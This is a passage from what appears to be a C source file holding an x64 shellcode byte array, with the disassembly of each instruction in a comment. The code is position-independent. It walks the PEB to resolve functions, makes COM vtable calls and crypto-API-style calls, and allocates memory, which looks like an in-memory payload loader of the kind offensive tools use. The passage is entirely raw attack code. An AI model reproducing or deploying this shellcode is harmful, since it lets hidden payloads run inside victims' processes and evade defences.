  /* 04E9 */ "\x8b\x86\xc4\x03\x00\x00"                 /* mov       eax, dword ptr [rsi + 0x3c4]         */
  /* 04EF */ "\xb9\x11\x00\x00\x00"                     /* mov       ecx, 0x11                            */
  /* 04F4 */ "\x89\x45\x87"                             /* mov       dword ptr [rbp - 0x79], eax          */
  /* 04F7 */ "\x8d\x51\xf0"                             /* lea       edx, dword ptr [rcx - 0x10]          */
  /* 04FA */ "\xff\x93\x80\x01\x00\x00"                 /* call      qword ptr [rbx + 0x180]              */
  /* 0500 */ "\x4c\x8b\xf0"                             /* mov       r14, rax                             */
  /* 0503 */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 0506 */ "\x0f\x84\x93\x02\x00\x00"                 /* je        0x79f                                */
  /* 050C */ "\x33\xc9"                                 /* xor       ecx, ecx                             */
  /* 050E */ "\x89\x4d\x67"                             /* mov       dword ptr [rbp + 0x67], ecx          */
  /* 0511 */ "\x48\x8b\x78\x10"                         /* mov       rdi, qword ptr [rax + 0x10]          */
  /* 0515 */ "\x39\x8e\xc4\x03\x00\x00"                 /* cmp       dword ptr [rsi + 0x3c4], ecx         */
  /* 051B */ "\x76\x1c"                                 /* jbe       0x539                                */
  /* 051D */ "\x8b\xd1"                                 /* mov       edx, ecx                             */
  /* 051F */ "\x8a\x8c\x31\xc8\x03\x00\x00"             /* mov       cl, byte ptr [rcx + rsi + 0x3c8]     */
  /* 0526 */ "\x88\x0c\x3a"                             /* mov       byte ptr [rdx + rdi], cl             */
  /* 0529 */ "\x8b\x4d\x67"                             /* mov       ecx, dword ptr [rbp + 0x67]          */
  /* 052C */ "\xff\xc1"                                 /* inc       ecx                                  */
  /* 052E */ "\x89\x4d\x67"                             /* mov       dword ptr [rbp + 0x67], ecx          */
  /* 0531 */ "\x3b\x8e\xc4\x03\x00\x00"                 /* cmp       ecx, dword ptr [rsi + 0x3c4]         */
  /* 0537 */ "\x72\xe4"                                 /* jb        0x51d                                */
  /* 0539 */ "\x48\x8d\x8e\x40\x01\x00\x00"             /* lea       rcx, qword ptr [rsi + 0x140]         */
  /* 0540 */ "\xff\x93\xa0\x01\x00\x00"                 /* call      qword ptr [rbx + 0x1a0]              */
  /* 0546 */ "\x48\x8d\x8e\x80\x01\x00\x00"             /* lea       rcx, qword ptr [rsi + 0x180]         */
  /* 054D */ "\x4c\x8b\xe0"                             /* mov       r12, rax                             */
  /* 0550 */ "\xff\x93\xa0\x01\x00\x00"                 /* call      qword ptr [rbx + 0x1a0]              */
  /* 0556 */ "\x48\x8d\x93\xc8\x02\x00\x00"             /* lea       rdx, qword ptr [rbx + 0x2c8]         */
  /* 055D */ "\x4c\x8b\xf8"                             /* mov       r15, rax                             */
  /* 0560 */ "\x48\x8d\x8b\xb8\x02\x00\x00"             /* lea       rcx, qword ptr [rbx + 0x2b8]         */
  /* 0567 */ "\x4c\x8d\x45\xaf"                         /* lea       r8, qword ptr [rbp - 0x51]           */
  /* 056B */ "\xff\x93\x78\x01\x00\x00"                 /* call      qword ptr [rbx + 0x178]              */
  /* 0571 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 0573 */ "\x0f\x88\x01\x02\x00\x00"                 /* js        0x77a                                */
  /* 0579 */ "\x48\x8b\x4d\xaf"                         /* mov       rcx, qword ptr [rbp - 0x51]          */
  /* 057D */ "\x4c\x8d\x83\xd8\x02\x00\x00"             /* lea       r8, qword ptr [rbx + 0x2d8]          */
  /* 0584 */ "\x48\x8d\x96\x00\x01\x00\x00"             /* lea       rdx, qword ptr [rsi + 0x100]         */
  /* 058B */ "\x4c\x8d\x4d\x7f"                         /* lea       r9, qword ptr [rbp + 0x7f]           */
  /* 058F */ "\x48\x8b\x39"                             /* mov       rdi, qword ptr [rcx]                 */
  /* 0592 */ "\xff\x57\x18"                             /* call      qword ptr [rdi + 0x18]               */
  /* 0595 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 0597 */ "\x0f\x88\xd3\x01\x00\x00"                 /* js        0x770                                */
  /* 059D */ "\x48\x8b\x4d\x7f"                         /* mov       rcx, qword ptr [rbp + 0x7f]          */
  /* 05A1 */ "\x48\x8d\x55\x6f"                         /* lea       rdx, qword ptr [rbp + 0x6f]          */
  /* 05A5 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 05A8 */ "\xff\x50\x50"                             /* call      qword ptr [rax + 0x50]               */
  /* 05AB */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 05AD */ "\x0f\x88\xb3\x01\x00\x00"                 /* js        0x766                                */
  /* 05B3 */ "\x83\x7d\x6f\x00"                         /* cmp       dword ptr [rbp + 0x6f], 0            */
  /* 05B7 */ "\x0f\x84\xa9\x01\x00\x00"                 /* je        0x766                                */
  /* 05BD */ "\x48\x8b\x4d\x7f"                         /* mov       rcx, qword ptr [rbp + 0x7f]          */
  /* 05C1 */ "\x4c\x8d\x83\xf8\x02\x00\x00"             /* lea       r8, qword ptr [rbx + 0x2f8]          */
  /* 05C8 */ "\x48\x8d\x93\xe8\x02\x00\x00"             /* lea       rdx, qword ptr [rbx + 0x2e8]         */
  /* 05CF */ "\x4c\x8d\x4d\x77"                         /* lea       r9, qword ptr [rbp + 0x77]           */
  /* 05D3 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 05D6 */ "\xff\x50\x48"                             /* call      qword ptr [rax + 0x48]               */
  /* 05D9 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 05DB */ "\x0f\x88\x85\x01\x00\x00"                 /* js        0x766                                */
  /* 05E1 */ "\x48\x8b\x4d\x77"                         /* mov       rcx, qword ptr [rbp + 0x77]          */
  /* 05E5 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 05E8 */ "\xff\x50\x50"                             /* call      qword ptr [rax + 0x50]               */
  /* 05EB */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 05ED */ "\x0f\x88\x69\x01\x00\x00"                 /* js        0x75c                                */
  /* 05F3 */ "\x48\x8b\x4d\x77"                         /* mov       rcx, qword ptr [rbp + 0x77]          */
  /* 05F7 */ "\x48\x8d\x55\xa7"                         /* lea       rdx, qword ptr [rbp - 0x59]          */
  /* 05FB */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 05FE */ "\xff\x50\x68"                             /* call      qword ptr [rax + 0x68]               */
  /* 0601 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 0603 */ "\x0f\x88\x49\x01\x00\x00"                 /* js        0x752                                */
  /* 0609 */ "\x48\x8b\x4d\xa7"                         /* mov       rcx, qword ptr [rbp - 0x59]          */
  /* 060D */ "\x48\x8d\x93\x08\x03\x00\x00"             /* lea       rdx, qword ptr [rbx + 0x308]         */
  /* 0614 */ "\x4c\x8d\x45\x9f"                         /* lea       r8, qword ptr [rbp - 0x61]           */
  /* 0618 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 061B */ "\xff\x10"                                 /* call      qword ptr [rax]                      */
  /* 061D */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 061F */ "\x0f\x88\x23\x01\x00\x00"                 /* js        0x748                                */
  /* 0625 */ "\x48\x8b\x4d\x9f"                         /* mov       rcx, qword ptr [rbp - 0x61]          */
  /* 0629 */ "\x4c\x8d\x45\x97"                         /* lea       r8, qword ptr [rbp - 0x69]           */
  /* 062D */ "\x49\x8b\xd6"                             /* mov       rdx, r14                             */
  /* 0630 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 0633 */ "\xff\x90\x68\x01\x00\x00"                 /* call      qword ptr [rax + 0x168]              */
  /* 0639 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 063B */ "\x0f\x88\xfd\x00\x00\x00"                 /* js        0x73e                                */
  /* 0641 */ "\x33\xc0"                                 /* xor       eax, eax                             */
  /* 0643 */ "\x48\x8d\x7d\xcf"                         /* lea       rdi, qword ptr [rbp - 0x31]          */
  /* 0647 */ "\x4c\x8d\x45\x8f"                         /* lea       r8, qword ptr [rbp - 0x71]           */
  /* 064B */ "\x49\x8b\xd4"                             /* mov       rdx, r12                             */
  /* 064E */ "\x8d\x48\x18"                             /* lea       ecx, dword ptr [rax + 0x18]          */
  /* 0651 */ "\xf3\xaa"                                 /* rep stosb byte ptr [rdi], al                   */
  /* 0653 */ "\x48\x8b\x4d\x97"                         /* mov       rcx, qword ptr [rbp - 0x69]          */
  /* 0657 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 065A */ "\xff\x90\x88\x00\x00\x00"                 /* call      qword ptr [rax + 0x88]               */
  /* 0660 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 0662 */ "\x0f\x88\xcc\x00\x00\x00"                 /* js        0x734                                */
  /* 0668 */ "\x44\x8b\x86\xc0\x01\x00\x00"             /* mov       r8d, dword ptr [rsi + 0x1c0]         */
  /* 066F */ "\x33\xff"                                 /* xor       edi, edi                             */
  /* 0671 */ "\x45\x85\xc0"                             /* test      r8d, r8d                             */
  /* 0674 */ "\x74\x64"                                 /* je        0x6da                                */
  /* 0676 */ "\x8d\x4f\x0c"                             /* lea       ecx, dword ptr [rdi + 0xc]           */
  /* 0679 */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 067B */ "\xff\x93\x88\x01\x00\x00"                 /* call      qword ptr [rbx + 0x188]              */
  /* 0681 */ "\x48\x8b\xf8"                             /* mov       rdi, rax                             */
  /* 0684 */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 0687 */ "\x74\x51"                                 /* je        0x6da                                */
  /* 0689 */ "\x33\xc0"                                 /* xor       eax, eax                             */
  /* 068B */ "\x89\x45\x67"                             /* mov       dword ptr [rbp + 0x67], eax          */
  /* 068E */ "\x39\x86\xc0\x01\x00\x00"                 /* cmp       dword ptr [rsi + 0x1c0], eax         */
  /* 0694 */ "\x76\x44"                                 /* jbe       0x6da                                */
  /* 0696 */ "\x8b\xc8"                                 /* mov       ecx, eax                             */
  /* 0698 */ "\x48\xc1\xe1\x06"                         /* shl       rcx, 6                               */
  /* 069C */ "\x48\x81\xc1\xc4\x01\x00\x00"             /* add       rcx, 0x1c4                           */
  /* 06A3 */ "\x48\x03\xce"                             /* add       rcx, rsi                             */
  /* 06A6 */ "\xff\x93\xa0\x01\x00\x00"                 /* call      qword ptr [rbx + 0x1a0]              */
  /* 06AC */ "\x48\x89\x45\xbf"                         /* mov       qword ptr [rbp - 0x41], rax          */
  /* 06B0 */ "\x4c\x8d\x45\xb7"                         /* lea       r8, qword ptr [rbp - 0x49]           */
  /* 06B4 */ "\x48\x8d\x55\x67"                         /* lea       rdx, qword ptr [rbp + 0x67]          */
  /* 06B8 */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 06BB */ "\xb8\x08\x00\x00\x00"                     /* mov       eax, 8                               */
  /* 06C0 */ "\x66\x89\x45\xb7"                         /* mov       word ptr [rbp - 0x49], ax            */
  /* 06C4 */ "\xff\x93\x90\x01\x00\x00"                 /* call      qword ptr [rbx + 0x190]              */
  /* 06CA */ "\x8b\x45\x67"                             /* mov       eax, dword ptr [rbp + 0x67]          */
  /* 06CD */ "\xff\xc0"                                 /* inc       eax                                  */
  /* 06CF */ "\x89\x45\x67"                             /* mov       dword ptr [rbp + 0x67], eax          */
  /* 06D2 */ "\x3b\x86\xc0\x01\x00\x00"                 /* cmp       eax, dword ptr [rsi + 0x1c0]         */
  /* 06D8 */ "\x72\xbc"                                 /* jb        0x696                                */
  /* 06DA */ "\x48\x8b\x4d\x8f"                         /* mov       rcx, qword ptr [rbp - 0x71]          */
  /* 06DE */ "\x48\x8d\x55\x07"                         /* lea       rdx, qword ptr [rbp + 7]             */
  /* 06E2 */ "\x0f\x10\x45\xcf"                         /* movups    xmm0, xmmword ptr [rbp - 0x31]       */
  /* 06E6 */ "\x45\x33\xc9"                             /* xor       r9d, r9d                             */
  /* 06E9 */ "\x48\x89\x54\x24\x30"                     /* mov       qword ptr [rsp + 0x30], rdx          */
  /* 06EE */ "\xf2\x0f\x10\x4d\xdf"                     /* movsd     xmm1, qword ptr [rbp - 0x21]         */
  /* 06F3 */ "\x48\x8d\x55\xe7"                         /* lea       rdx, qword ptr [rbp - 0x19]          */
  /* 06F7 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 06FA */ "\x41\xb8\x18\x01\x00\x00"                 /* mov       r8d, 0x118                           */
  /* 0700 */ "\x48\x89\x7c\x24\x28"                     /* mov       qword ptr [rsp + 0x28], rdi          */
  /* 0705 */ "\x48\x89\x54\x24\x20"                     /* mov       qword ptr [rsp + 0x20], rdx          */
  /* 070A */ "\x49\x8b\xd7"                             /* mov       rdx, r15                             */
  /* 070D */ "\x0f\x29\x45\xe7"                         /* movaps    xmmword ptr [rbp - 0x19], xmm0       */
  /* 0711 */ "\xf2\x0f\x11\x4d\xf7"                     /* movsd     qword ptr [rbp - 9], xmm1            */
  /* 0716 */ "\xff\x90\xc8\x01\x00\x00"                 /* call      qword ptr [rax + 0x1c8]              */
  /* 071C */ "\x48\x85\xff"                             /* test      rdi, rdi                             */
  /* 071F */ "\x74\x09"                                 /* je        0x72a                                */
  /* 0721 */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 0724 */ "\xff\x93\x98\x01\x00\x00"                 /* call      qword ptr [rbx + 0x198]              */
  /* 072A */ "\x48\x8b\x4d\x8f"                         /* mov       rcx, qword ptr [rbp - 0x71]          */
  /* 072E */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 0731 */ "\xff\x50\x10"                             /* call      qword ptr [rax + 0x10]               */
  /* 0734 */ "\x48\x8b\x4d\x97"                         /* mov       rcx, qword ptr [rbp - 0x69]          */
  /* 0738 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 073B */ "\xff\x50\x10"                             /* call      qword ptr [rax + 0x10]               */
  /* 073E */ "\x48\x8b\x4d\x9f"                         /* mov       rcx, qword ptr [rbp - 0x61]          */
  /* 0742 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 0745 */ "\xff\x50\x10"                             /* call      qword ptr [rax + 0x10]               */
  /* 0748 */ "\x48\x8b\x4d\xa7"                         /* mov       rcx, qword ptr [rbp - 0x59]          */
  /* 074C */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 074F */ "\xff\x50\x10"                             /* call      qword ptr [rax + 0x10]               */
  /* 0752 */ "\x48\x8b\x4d\x77"                         /* mov       rcx, qword ptr [rbp + 0x77]          */
  /* 0756 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 0759 */ "\xff\x50\x58"                             /* call      qword ptr [rax + 0x58]               */
  /* 075C */ "\x48\x8b\x4d\x77"                         /* mov       rcx, qword ptr [rbp + 0x77]          */
  /* 0760 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 0763 */ "\xff\x50\x10"                             /* call      qword ptr [rax + 0x10]               */
  /* 0766 */ "\x48\x8b\x4d\x7f"                         /* mov       rcx, qword ptr [rbp + 0x7f]          */
  /* 076A */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 076D */ "\xff\x50\x10"                             /* call      qword ptr [rax + 0x10]               */
  /* 0770 */ "\x48\x8b\x4d\xaf"                         /* mov       rcx, qword ptr [rbp - 0x51]          */
  /* 0774 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 0777 */ "\xff\x50\x10"                             /* call      qword ptr [rax + 0x10]               */
  /* 077A */ "\x49\x8b\xce"                             /* mov       rcx, r14                             */
  /* 077D */ "\xff\x93\x98\x01\x00\x00"                 /* call      qword ptr [rbx + 0x198]              */
  /* 0783 */ "\x4d\x85\xe4"                             /* test      r12, r12                             */
  /* 0786 */ "\x74\x09"                                 /* je        0x791                                */
  /* 0788 */ "\x49\x8b\xcc"                             /* mov       rcx, r12                             */
  /* 078B */ "\xff\x93\xa8\x01\x00\x00"                 /* call      qword ptr [rbx + 0x1a8]              */
  /* 0791 */ "\x4d\x85\xff"                             /* test      r15, r15                             */
  /* 0794 */ "\x74\x09"                                 /* je        0x79f                                */
  /* 0796 */ "\x49\x8b\xcf"                             /* mov       rcx, r15                             */
  /* 0799 */ "\xff\x93\xa8\x01\x00\x00"                 /* call      qword ptr [rbx + 0x1a8]              */
  /* 079F */ "\x48\x81\xc4\xe0\x00\x00\x00"             /* add       rsp, 0xe0                            */
  /* 07A6 */ "\x41\x5f"                                 /* pop       r15                                  */
  /* 07A8 */ "\x41\x5e"                                 /* pop       r14                                  */
  /* 07AA */ "\x41\x5c"                                 /* pop       r12                                  */
  /* 07AC */ "\x5f"                                     /* pop       rdi                                  */
  /* 07AD */ "\x5e"                                     /* pop       rsi                                  */
  /* 07AE */ "\x5b"                                     /* pop       rbx                                  */
  /* 07AF */ "\x5d"                                     /* pop       rbp                                  */
  /* 07B0 */ "\xc3"                                     /* ret                                            */
  /* 07B1 */ "\xcc"                                     /* int3                                           */
  /* 07B2 */ "\xcc"                                     /* int3                                           */
  /* 07B3 */ "\xcc"                                     /* int3                                           */
  /* 07B4 */ "\x40\x55"                                 /* push      rbp                                  */
  /* 07B6 */ "\x53"                                     /* push      rbx                                  */
  /* 07B7 */ "\x56"                                     /* push      rsi                                  */
  /* 07B8 */ "\x57"                                     /* push      rdi                                  */
  /* 07B9 */ "\x41\x56"                                 /* push      r14                                  */
  /* 07BB */ "\x41\x57"                                 /* push      r15                                  */
  /* 07BD */ "\x48\x8b\xec"                             /* mov       rbp, rsp                             */
  /* 07C0 */ "\x48\x83\xec\x58"                         /* sub       rsp, 0x58                            */
  /* 07C4 */ "\x33\xff"                                 /* xor       edi, edi                             */
  /* 07C6 */ "\x48\x8d\xb1\xd8\x05\x00\x00"             /* lea       rsi, qword ptr [rcx + 0x5d8]         */
  /* 07CD */ "\x83\xb9\x18\x03\x00\x00\x01"             /* cmp       dword ptr [rcx + 0x318], 1           */
  /* 07D4 */ "\x48\x8b\xd9"                             /* mov       rbx, rcx                             */
  /* 07D7 */ "\x48\x89\x7d\x48"                         /* mov       qword ptr [rbp + 0x48], rdi          */
  /* 07DB */ "\x89\x7d\x38"                             /* mov       dword ptr [rbp + 0x38], edi          */
  /* 07DE */ "\x74\x03"                                 /* je        0x7e3                                */
  /* 07E0 */ "\x48\x8b\x36"                             /* mov       rsi, qword ptr [rsi]                 */
  /* 07E3 */ "\x41\xb9\x18\x00\x00\x00"                 /* mov       r9d, 0x18                            */
  /* 07E9 */ "\xc7\x44\x24\x20\x40\x00\x00\xf0"         /* mov       dword ptr [rsp + 0x20], 0xf0000040   */
  /* 07F1 */ "\x45\x33\xc0"                             /* xor       r8d, r8d                             */
  /* 07F4 */ "\x48\x8d\x4d\x48"                         /* lea       rcx, qword ptr [rbp + 0x48]          */
  /* 07F8 */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 07FA */ "\xff\x93\xf8\x01\x00\x00"                 /* call      qword ptr [rbx + 0x1f8]              */
  /* 0800 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 0802 */ "\x0f\x84\x79\x01\x00\x00"                 /* je        0x981                                */
  /* 0808 */ "\x45\x33\xc9"                             /* xor       r9d, r9d                             */
  /* 080B */ "\x48\x89\x7c\x24\x30"                     /* mov       qword ptr [rsp + 0x30], rdi          */
  /* 0810 */ "\x48\x8d\x45\x38"                         /* lea       rax, qword ptr [rbp + 0x38]          */
  /* 0814 */ "\x48\x89\x7c\x24\x28"                     /* mov       qword ptr [rsp + 0x28], rdi          */
  /* 0819 */ "\x4c\x8d\xbb\xac\x03\x00\x00"             /* lea       r15, qword ptr [rbx + 0x3ac]         */
  /* 0820 */ "\x48\x89\x44\x24\x20"                     /* mov       qword ptr [rsp + 0x20], rax          */
  /* 0825 */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 0827 */ "\x49\x8b\xcf"                             /* mov       rcx, r15                             */
  /* 082A */ "\x45\x8d\x41\x07"                         /* lea       r8d, dword ptr [r9 + 7]              */
  /* 082E */ "\xff\x93\x30\x02\x00\x00"                 /* call      qword ptr [rbx + 0x230]              */
  /* 0834 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 0836 */ "\x0f\x84\x37\x01\x00\x00"                 /* je        0x973                                */
  /* 083C */ "\x8b\x55\x38"                             /* mov       edx, dword ptr [rbp + 0x38]          */
  /* 083F */ "\x33\xc9"                                 /* xor       ecx, ecx                             */
  /* 0841 */ "\x41\xb8\x00\x30\x00\x00"                 /* mov       r8d, 0x3000                          */
  /* 0847 */ "\x44\x8d\x49\x04"                         /* lea       r9d, dword ptr [rcx + 4]             */
  /* 084B */ "\xff\x93\x40\x01\x00\x00"                 /* call      qword ptr [rbx + 0x140]              */
  /* 0851 */ "\x4c\x8b\xf0"                             /* mov       r14, rax                             */
  /* 0854 */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 0857 */ "\x0f\x84\x16\x01\x00\x00"                 /* je        0x973                                */
  /* 085D */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 085F */ "\x48\x89\x7c\x24\x30"                     /* mov       qword ptr [rsp + 0x30], rdi          */
  /* 0864 */ "\x48\x8d\x45\x38"                         /* lea       rax, qword ptr [rbp + 0x38]          */
  /* 0868 */ "\x48\x89\x7c\x24\x28"                     /* mov       qword ptr [rsp + 0x28], rdi          */
  /* 086D */ "\x4d\x8b\xce"                             /* mov       r9, r14                              */
  /* 0870 */ "\x48\x89\x44\x24\x20"                     /* mov       qword ptr [rsp + 0x20], rax          */
  /* 0875 */ "\x49\x8b\xcf"                             /* mov       rcx, r15                             */
  /* 0878 */ "\x44\x8d\x42\x07"                         /* lea       r8d, dword ptr [rdx + 7]             */
  /* 087C */ "\xff\x93\x30\x02\x00\x00"                 /* call      qword ptr [rbx + 0x230]              */
  /* 0882 */ "\x44\x8b\x4d\x38"                         /* mov       r9d, dword ptr [rbp + 0x38]          */
  /* 0886 */ "\x48\x8d\x45\x40"                         /* lea       rax, qword ptr [rbp + 0x40]          */
  /* 088A */ "\x48\x89\x44\x24\x38"                     /* mov       qword ptr [rsp + 0x38], rax          */
  /* 088F */ "\x4d\x8b\xc6"                             /* mov       r8, r14                              */
  /* 0892 */ "\x48\x8d\x45\xf0"                         /* lea       rax, qword ptr [rbp - 0x10]          */
  /* 0896 */ "\xba\x08\x00\x00\x00"                     /* mov       edx, 8                               */
  /* 089B */ "\x48\x89\x44\x24\x30"                     /* mov       qword ptr [rsp + 0x30], rax          */
  /* 08A0 */ "\xb9\x01\x00\x01\x00"                     /* mov       ecx, 0x10001                         */
  /* 08A5 */ "\x48\x89\x7c\x24\x28"                     /* mov       qword ptr [rsp + 0x28], rdi          */
  /* 08AA */ "\xc7\x44\x24\x20\x00\x80\x00\x00"         /* mov       dword ptr [rsp + 0x20], 0x8000       */
  /* 08B2 */ "\xff\x93\x38\x02\x00\x00"                 /* call      qword ptr [rbx + 0x238]              */
  /* 08B8 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 08BA */ "\x0f\x84\xa2\x00\x00\x00"                 /* je        0x962                                */
  /* 08C0 */ "\x4c\x8b\x45\xf0"                         /* mov       r8, qword ptr [rbp - 0x10]           */
  /* 08C4 */ "\x4c\x8d\x4d\xe8"                         /* lea       r9, qword ptr [rbp - 0x18]           */
  /* 08C8 */ "\x48\x8b\x4d\x48"                         /* mov       rcx, qword ptr [rbp + 0x48]          */
  /* 08CC */ "\xba\x01\x00\x00\x00"                     /* mov       edx, 1                               */
  /* 08D1 */ "\xff\x93\x40\x02\x00\x00"                 /* call      qword ptr [rbx + 0x240]              */
  /* 08D7 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 08D9 */ "\x74\x7d"                                 /* je        0x958                                */
  /* 08DB */ "\x48\x8b\x4d\x48"                         /* mov       rcx, qword ptr [rbp + 0x48]          */
  /* 08DF */ "\x48\x8d\x45\x50"                         /* lea       rax, qword ptr [rbp + 0x50]          */
  /* 08E3 */ "\x45\x33\xc9"                             /* xor       r9d, r9d                             */
  /* 08E6 */ "\x48\x89\x44\x24\x20"                     /* mov       qword ptr [rsp + 0x20], rax          */
  /* 08EB */ "\x45\x33\xc0"                             /* xor       r8d, r8d                             */
  /* 08EE */ "\xba\x0c\x80\x00\x00"                     /* mov       edx, 0x800c                          */
  /* 08F3 */ "\xff\x93\x00\x02\x00\x00"                 /* call      qword ptr [rbx + 0x200]              */
  /* 08F9 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 08FB */ "\x74\x51"                                 /* je        0x94e                                */
  /* 08FD */ "\x44\x8b\x83\xd0\x05\x00\x00"             /* mov       r8d, dword ptr [rbx + 0x5d0]         */
  /* 0904 */ "\x48\x8d\x96\x00\x01\x00\x00"             /* lea       rdx, qword ptr [rsi + 0x100]         */
  /* 090B */ "\x48\x8b\x4d\x50"                         /* mov       rcx, qword ptr [rbp + 0x50]          */
  /* 090F */ "\x41\xbf\x00\x01\x00\x00"                 /* mov       r15d, 0x100                          */
  /* 0915 */ "\x45\x2b\xc7"                             /* sub       r8d, r15d                            */
  /* 0918 */ "\x45\x33\xc9"                             /* xor       r9d, r9d                             */
  /* 091B */ "\xff\x93\x08\x02\x00\x00"                 /* call      qword ptr [rbx + 0x208]              */
  /* 0921 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 0923 */ "\x74\x1f"                                 /* je        0x944                                */
  /* 0925 */ "\x4c\x8b\x4d\xe8"                         /* mov       r9, qword ptr [rbp - 0x18]           */
  /* 0929 */ "\x45\x8b\xc7"                             /* mov       r8d, r15d                            */
  /* 092C */ "\x48\x8b\x4d\x50"                         /* mov       rcx, qword ptr [rbp + 0x50]          */
  /* 0930 */ "\x48\x8b\xd6"                             /* mov       rdx, rsi                             */
  /* 0933 */ "\x89\x7c\x24\x28"                         /* mov       dword ptr [rsp + 0x28], edi          */
  /* 0937 */ "\x48\x89\x7c\x24\x20"                     /* mov       qword ptr [rsp + 0x20], rdi          */
  /* 093C */ "\xff\x93\x10\x02\x00\x00"                 /* call      qword ptr [rbx + 0x210]              */
  /* 0942 */ "\x8b\xf8"                                 /* mov       edi, eax                             */
  /* 0944 */ "\x48\x8b\x4d\x50"                         /* mov       rcx, qword ptr [rbp + 0x50]          */
  /* 0948 */ "\xff\x93\x18\x02\x00\x00"                 /* call      qword ptr [rbx + 0x218]              */
  /* 094E */ "\x48\x8b\x4d\xe8"                         /* mov       rcx, qword ptr [rbp - 0x18]          */
  /* 0952 */ "\xff\x93\x20\x02\x00\x00"                 /* call      qword ptr [rbx + 0x220]              */
  /* 0958 */ "\x48\x8b\x4d\xf0"                         /* mov       rcx, qword ptr [rbp - 0x10]          */
  /* 095C */ "\xff\x93\x50\x01\x00\x00"                 /* call      qword ptr [rbx + 0x150]              */
  /* 0962 */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 0964 */ "\x41\xb8\x00\xc0\x00\x00"                 /* mov       r8d, 0xc000                          */
  /* 096A */ "\x49\x8b\xce"                             /* mov       rcx, r14                             */
  /* 096D */ "\xff\x93\x48\x01\x00\x00"                 /* call      qword ptr [rbx + 0x148]              */
  /* 0973 */ "\x48\x8b\x4d\x48"                         /* mov       rcx, qword ptr [rbp + 0x48]          */
  /* 0977 */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 0979 */ "\xff\x93\x28\x02\x00\x00"                 /* call      qword ptr [rbx + 0x228]              */
  /* 097F */ "\x8b\xc7"                                 /* mov       eax, edi                             */
  /* 0981 */ "\x48\x83\xc4\x58"                         /* add       rsp, 0x58                            */
  /* 0985 */ "\x41\x5f"                                 /* pop       r15                                  */
  /* 0987 */ "\x41\x5e"                                 /* pop       r14                                  */
  /* 0989 */ "\x5f"                                     /* pop       rdi                                  */
  /* 098A */ "\x5e"                                     /* pop       rsi                                  */
  /* 098B */ "\x5b"                                     /* pop       rbx                                  */
  /* 098C */ "\x5d"                                     /* pop       rbp                                  */
  /* 098D */ "\xc3"                                     /* ret                                            */
  /* 098E */ "\xcc"                                     /* int3                                           */
  /* 098F */ "\xcc"                                     /* int3                                           */
  /* 0990 */ "\x48\x89\x5c\x24\x08"                     /* mov       qword ptr [rsp + 8], rbx             */
  /* 0995 */ "\x48\x89\x74\x24\x10"                     /* mov       qword ptr [rsp + 0x10], rsi          */
  /* 099A */ "\x57"                                     /* push      rdi                                  */
  /* 099B */ "\x48\x83\xec\x20"                         /* sub       rsp, 0x20                            */
  /* 099F */ "\x65\x48\x8b\x04\x25\x60\x00\x00\x00"     /* mov       rax, qword ptr gs:[0x60]             */
  /* 09A8 */ "\x48\x8b\xfa"                             /* mov       rdi, rdx                             */
  /* 09AB */ "\x48\x8b\xf1"                             /* mov       rsi, rcx                             */
  /* 09AE */ "\x45\x33\xc9"                             /* xor       r9d, r9d                             */
  /* 09B1 */ "\x4c\x8b\x40\x18"                         /* mov       r8, qword ptr [rax + 0x18]           */
  /* 09B5 */ "\x49\x8b\x58\x10"                         /* mov       rbx, qword ptr [r8 + 0x10]           */
  /* 09B9 */ "\xeb\x19"                                 /* jmp       0x9d4                                */
  /* 09BB */ "\x4d\x85\xc9"                             /* test      r9, r9                               */
  /* 09BE */ "\x75\x1d"                                 /* jne       0x9dd                                */
  /* 09C0 */ "\x4c\x8b\xc7"                             /* mov       r8, rdi                              */
  /* 09C3 */ "\x48\x8b\xd6"                             /* mov       rdx, rsi                             */
  /* 09C6 */ "\x48\x8b\xc8"                             /* mov       rcx, rax                             */
